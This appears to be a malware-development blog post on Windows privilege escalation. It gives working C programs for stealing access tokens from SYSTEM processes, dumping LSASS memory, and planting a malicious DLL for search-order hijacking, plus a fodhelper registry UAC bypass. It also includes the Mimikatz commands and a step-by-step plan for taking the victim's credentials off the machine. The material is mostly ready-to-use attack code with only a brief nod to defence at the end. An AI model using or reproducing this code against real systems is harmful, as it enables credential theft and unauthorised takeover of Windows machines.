In this post, we'll explore various privilege escalation techniques that malware uses to gain elevated access on Windows systems. These methods are crucial for understanding how attackers move from limited user privileges to full system control.

## Access Tokens

Windows access tokens are fundamental to understanding privilege escalation. They contain security information that determines what a process can do on the system.

### Understanding Windows Tokens

After successful user authentication, the [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) generates a new login session and an access token.

![token](assets/images/maldev/4/token.png)

Each login instance is characterized by a 64-bit **Locally Unique Identifier (LUID)**, commonly referred to as the **Logon ID**. Every access token must contain an **Authentication ID (AuthId)** parameter that identifies the associated login session using this LUID.

The main objective of access tokens is to function as a *transient repository for security configurations* associated with the logon session, which can be modified in real-time. Windows developers interact with the access token that represents the logon session, residing within the *lsass* process.

### Token Manipulation Functions

Developers can copy existing tokens using the **DuplicateTokenEx** function:

```c 
BOOL DuplicateTokenEx(
HANDLE                       hExistingToken,
DWORD                        dwDesiredAccess,
LPSECURITY_ATTRIBUTES        lpTokenAttributes,
SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
TOKEN_TYPE                   TokenType,
PHANDLE                      phNewToken
);
```

The calling thread can assume the security context of a currently logged-in user through the **ImpersonateLoggedOnUser** function:

```c 
BOOL ImpersonateLoggedOnUser(
  HANDLE hToken
);
```

### Token Components and Privileges

Tokens include a login **Security Identifier (SID)** that identifies the ongoing logon session. User account rights dictate specific system actions that can be performed. The assignment of user and group rights is carried out by administrators.

Access token routines employ the LUID type to identify and manipulate privileges. The **LookupPrivilegeValue** function can ascertain the locally assigned LUID for a privilege constant:

```c 
BOOL LookupPrivilegeValueA(
  LPCSTR  lpSystemName,
  LPCSTR  lpName,
  PLUID   lpLuid
);
```

### Viewing Token Information

Token information can be accessed with PowerShell commands:
```powershell
whoami /all
whoami /priv
```

It can also be viewed with Process Explorer:

### Token Types

There are two types of access tokens:
1. **Primary** (or sometimes delegate)
2. **Impersonation**

Primary tokens are generated upon user login to a Windows domain, either by physically accessing a Windows machine or remotely connecting via Remote Desktop.

Impersonation tokens typically operate within a distinct security context from the procedure that began their creation. Non-interactive tokens are employed for mounting network shares or executing domain logon routines.

### Administrator Privileges

When launching two command prompts - one as administrator and another as an unprivileged user:

![priv](assets/images/maldev/4/cmd.png)

The cmd.exe launched with elevated administrator rights has the `BUILTIN\Administrators` flag assigned as **Owner**, meaning it executes within the security context associated with administrator rights.

This implies several key capabilities:
- **Impersonate client** upon authentication using **SeImpersonatePrivilege**
- **Debug programs** using **SeDebugPrivilege**

### SeDebugPrivilege

When a token possesses *SeDebugPrivilege*, it grants the user the ability to circumvent access checks in the kernel for specific objects. A handle to any process within the system can be obtained by enabling *SeDebugPrivilege* permission in the calling process. This allows the caller process to invoke the **OpenProcess** Win32 API to acquire a handle with *PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, or PROCESS_QUERY_LIMITED_INFORMATION*.

### Token Manipulation Example

One tactic employed in token manipulation is to utilize a stolen token from a different process to establish a new process.

![priv](assets/images/maldev/4/copytoken.png)

The process involves:
1. Ensuring **SeDebugPrivilege** is enabled in the current set of privileges
2. Opening the process from which we want to obtain the access token's handle
3. Creating a copy of the process's access token
4. Initiating a new process with the newly acquired access token

```c 
#include <windows.h>
#include <stdio.h>
#include <iostream>

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;

  CloseHandle(token);
  printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
  return res;
}

// get access token
HANDLE getToken(DWORD pid) {
  HANDLE cToken = NULL;
  HANDLE ph = NULL;
  if (pid == 0) {
    ph = GetCurrentProcess();
  } else {
    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
  }
  if (!ph) cToken = (HANDLE)NULL;
  printf(ph ? "successfully get process handle :)\n" : "failed to get process handle :(\n");
  BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
  if (!res) cToken = (HANDLE)NULL;
  printf((cToken != (HANDLE)NULL) ? "successfully get access token :)\n" : "failed to get access token :(\n");
  return cToken;
}

// create process
BOOL createProcess(HANDLE token, LPCWSTR app) {
  HANDLE dToken = NULL;
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  BOOL res = TRUE;
  ZeroMemory(&si, sizeof(STARTUPINFOW));
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  si.cb = sizeof(STARTUPINFOW);

  res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
  printf(res ? "successfully duplicate process token :)\n" : "failed to duplicate process token :(\n");
  res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
  printf(res ? "successfully create process :)\n" : "failed to create process :(\n");
  return res;
}

int main(int argc, char** argv) {
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  DWORD pid = atoi(argv[1]);
  HANDLE cToken = getToken(pid);
  if (!createProcess(cToken, L"C:\\Windows\\System32\\mspaint.exe")) return -1;
  return 0;
}
```

For example, we could get the PID of winlogon with `Get-Process winlogon` and use `.\hack.exe <PID>` to launch mspaint with the access token of `winlogon.exe` under the SYSTEM account. By checking the token, mspaint would have `SeDebugPrivilege`.

### Impersonation

**ImpersonateLoggedOnUser** can be utilized to grant the current thread the ability to assume the persona of a different user who is currently signed in. The thread will persist in impersonating the logged-on user until either the **RevertToSelf()** function is called or the thread terminates.

This technique is used by Ryuk and Blackcat ransomware and many open-source remote administration and post-exploitation frameworks.

## Password Stealing

The **Local Security Authority Server Service (LSASS)** is a crucial component of Windows OS, tasked with implementing security policies on the system. Essentially, the system retains local usernames and corresponding passwords or password hashes within its storage. The extraction of this material is a frequently seen practice among adversaries and red teamers.

**Mimikatz** is widely recognized as a famous post-exploitation tool that facilitates extraction of **New Technology LAN Manager (NTLM)** hashes by dumping the *lsass* process.

We will demonstrate the process of extracting *lsass* memory without relying on Mimikatz by utilizing the **MiniDumpWriteDump** API. Due to widespread recognition and detectability of Mimikatz, hackers continually seek innovative methods to reintegrate some functionalities derived from its underlying logic.

### LSASS Dumping Implementation

```c 
BOOL MiniDumpWriteDump(
  [in] HANDLE                            hProcess,
  [in] DWORD                             ProcessId,
  [in] HANDLE                            hFile,
  [in] MINIDUMP_TYPE                     DumpType,
  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);
```

**MiniDumpWriteDump** is a Windows API function that generates a minidump file, a small snapshot of an application's state at the moment the function is invoked. The file is valuable for debugging because it contains exception information, a list of loaded DLLs, stack information, and other system state data.

```c 
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")

int locateTargetProcess(const char *targetProcName) {

  HANDLE processSnapshot;
  PROCESSENTRY32 processEntry;
  int processID = 0;
  BOOL operationResult;

  // snapshot of all processes in the system
  processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == processSnapshot) return 0;

  // initializing size: needed for using Process32First
  processEntry.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  operationResult = Process32First(processSnapshot, &processEntry);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (operationResult) {
    // if we find the process: return process ID
    if (strcmp(targetProcName, processEntry.szExeFile) == 0) {
      processID = processEntry.th32ProcessID;
      break;
    }
    operationResult = Process32Next(processSnapshot, &processEntry);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(processSnapshot);
  return processID;
}

// set privilege
BOOL enablePrivilege(LPCTSTR privilegeName) {
  HANDLE processToken;
  TOKEN_PRIVILEGES tokenPrivileges;
  LUID privilegeLUID;
  BOOL result = TRUE;

  if (!LookupPrivilegeValue(NULL, privilegeName, &privilegeLUID)) result = FALSE;

  tokenPrivileges.PrivilegeCount = 1;
  tokenPrivileges.Privileges[0].Luid = privilegeLUID;
  tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &processToken)) result = FALSE;
  if (!AdjustTokenPrivileges(processToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) result = FALSE;
  printf(result ? "successfully enabled %s :)\n" : "failed to enable %s :(\n", privilegeName);
  return result;
}

// create minidump of lsass.exe
BOOL generateMiniDump() {
  bool dumpSuccess = FALSE;
  int processID = locateTargetProcess("lsass.exe");
  HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processID);
  HANDLE outputHandle = CreateFile((LPCTSTR)"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (processHandle && outputHandle != INVALID_HANDLE_VALUE) {
    dumpSuccess = MiniDumpWriteDump(processHandle, processID, outputHandle, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
    printf(dumpSuccess ? "successfully dumped to lsass.dmp :)\n" : "failed to dump :(\n");
  } 
  return dumpSuccess; 
}

int main(int argc, char* argv[]) {
  if (!enablePrivilege(SE_DEBUG_NAME)) return -1;
  if (!generateMiniDump()) return -1;
  return 0;
}
```

### Using the Dump

By launching this on Windows, we get an `lsass.dmp` file. We can then import the dump file in Mimikatz and extract passwords:

```powershell
.\mimikatz.exe
sekurlsa::minidump c:\temp\lsass.dmp
sekurlsa::logonpasswords
```

![priv](assets/images/maldev/4/mimikatz.png)

The tactic here is:
1. Execute hack.exe on the victim machine to dump lsass
2. Move lsass.dmp from victim to attacker machine
3. Use Mimikatz on the attacker machine to obtain victim's credentials

Many **Advanced Persistent Threats (APTs)** and hacking tools apply this tactic. For example, [**Cobalt Strike**](https://attack.mitre.org/software/S0154) can spawn jobs that inject password hashes into LSASS memory and dump them. [**Fox Kitten**](https://attack.mitre.org/groups/G0117) and [**HAFNIUM**](https://attack.mitre.org/groups/G0125) utilize procdump to dump memory of the lsass process.

Many LSASS dump methods exist, not only in C programming language, with variations in C#, PowerShell, Rust, and Go.

## DLL Search Order Hijacking for Privilege Escalation

We can use the DLL hijacking technique to create a situation where a privileged process would load a (missing) DLL that we had placed strategically. To execute this operation, we need the following information:
- The service or application that is missing the necessary DLL file
- The name of the required DLL file that is absent
- The location where this DLL should be placed
- The permissions granted for the route

For a specific application, we could use Process Monitor as previously explained.

### Malicious DLL Implementation

```c 
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
  if (dwReason == DLL_PROCESS_ATTACH) {
    system("cmd.exe");
    ExitProcess(0);
  }
  return TRUE;
}
```

Compile with:
```bash 
 x86_64-w64-mingw32-gcc hack.c -shared -o output.dll
```

After placing the malicious DLL in the correct path and assuming the application runs as *SYSTEM*, the user will be granted these permissions.

**Note**: In some cases, the DLL should export multiple functions to be loaded by the victim process. If these functions do not exist, the binary will not be able to load them and the exploit will fail.

## UAC Bypass Techniques

There are many ways to bypass User Account Control (UAC). Here we'll explore modifying the registry via **fodhelper.exe**.

By modifying specific registry keys, the execution flow of a privileged program is ultimately redirected to a controlled command. Common occurrences of key-value misuses frequently involve manipulation of windir and systemroot environment variables, as well as shell open commands that target particular file extensions, depending on the program that is targeted:

- `HKCU\Software\Classes\<targeted_extension>\shell\open\command` (Default or DelegateExecute values)
- `HKCU\Environment\windir`
- `HKCU\Environment\systemroot`

### Understanding fodhelper.exe

Fodhelper.exe is designed to facilitate management of optional features such as region-specific keyboard settings. It's located at `C:\Windows\System32\fodhelper.exe` and has been digitally signed by Microsoft, indicating its authenticity and integrity:

![signature](assets/images/maldev/4/signature.png)

Upon initiation of *fodhelper.exe*, Process Monitor captures comprehensive information including registry and filesystem read/write actions. The **HKEY_CURRENT_USER** registry keys are particularly advantageous for evaluating potential impact on program behavior following the creation of new registry keys, as they do not necessitate specific authorizations for modifications.

*fodhelper.exe* is designed to locate the **HKCU:\Software\Classes\ms-settings\shell\open\command** registry key. The default configuration of Windows 10 does not include the existence of this specific key.

When malware executes the **fodhelper** binary (a Windows component that enables elevation without the need for UAC prompt), Windows raises the integrity level of fodhelper from *Medium* to *High*. The *High* integrity fodhelper subsequently attempts to access an *ms-settings* file by employing the file's default handler. Given that the handler has been compromised by malware of moderate integrity, the elevated fodhelper will proceed to carry out an attack command in the form of a process with high integrity.

### UAC Bypass Implementation

```c 
#include <windows.h>
#include <stdio.h>

int main() {
  HKEY registryKey;
  DWORD disposition;

  const char* registryPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
  const char* command = "cmd /c start C:\\Windows\\System32\\cmd.exe"; // default program
  const char* delegateExecute = "";

  // Attempt to open the registry key
  LSTATUS status = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)registryPath, 0, NULL, 0, KEY_WRITE, NULL, &registryKey, &disposition);
  printf(status != ERROR_SUCCESS ? "Failed to open or create the registry key.\n" : "Successfully created the registry key.\n");

  // Set the registry values
  status = RegSetValueEx(registryKey, "", 0, REG_SZ, (unsigned char*)command, strlen(command));
  printf(status != ERROR_SUCCESS ? "Failed to set the registry value.\n" : "Successfully set the registry value.\n");

  status = RegSetValueEx(registryKey, "DelegateExecute", 0, REG_SZ, (unsigned char*)delegateExecute, strlen(delegateExecute));
  printf(status != ERROR_SUCCESS ? "Failed to set the registry value: DelegateExecute.\n" : "Successfully set the registry value: DelegateExecute.\n");

  // Close the registry key handle
  RegCloseKey(registryKey);

  // Start the fodhelper.exe program
  SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
  shellExecuteInfo.lpVerb = "runas";
  shellExecuteInfo.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
  shellExecuteInfo.hwnd = NULL;
  shellExecuteInfo.nShow = SW_NORMAL;

  if (!ShellExecuteEx(&shellExecuteInfo)) {
    DWORD error = GetLastError();
    printf (error == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", error);
  } else {
    printf("Successfully created the process =^..^=\n");
  }
  
  return 0;
}
```

### Execution Results

In action, it will look like this:

![uac](assets/images/maldev/4/uacbypass1.png)

Here we have launched the malware, which opens the registry key, sets key values, closes the registry handle, and finally launches fodhelper.exe in elevated mode.

![uac](assets/images/maldev/4/uacbypass2.png)

Upon execution of the malware, we can see the registry modifications.

## Summary

We've explored several key privilege escalation techniques:

- **Access Token Manipulation**: Stealing and duplicating tokens from privileged processes
- **LSASS Memory Dumping**: Extracting password hashes using MiniDumpWriteDump
- **DLL Search Order Hijacking**: Exploiting missing DLLs in privileged processes
- **UAC Bypass**: Using fodhelper.exe to bypass User Account Control

Each technique offers different advantages in terms of stealth, detection difficulty, and privilege level achieved, making them valuable tools for understanding both offensive and defensive security.
